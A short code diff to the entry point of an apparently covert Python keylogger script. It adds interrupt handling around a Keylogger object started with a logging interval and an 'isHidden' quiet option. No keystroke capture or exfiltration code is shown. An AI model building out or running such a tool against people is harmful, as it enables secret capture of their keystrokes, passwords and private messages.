@@ -73,5 +73,9 @@ if __name__ == "__main__":
     interval = int(options.interval)
     quiet = options.isHidden
     
-    keylogger = Keylogger(interval, quiet)
-    keylogger.start()
+    try:
+        keylogger = Keylogger(interval, quiet)
+        keylogger.start()
+    except KeyboardInterrupt:
+        if not quiet:
+            print("Exiting")
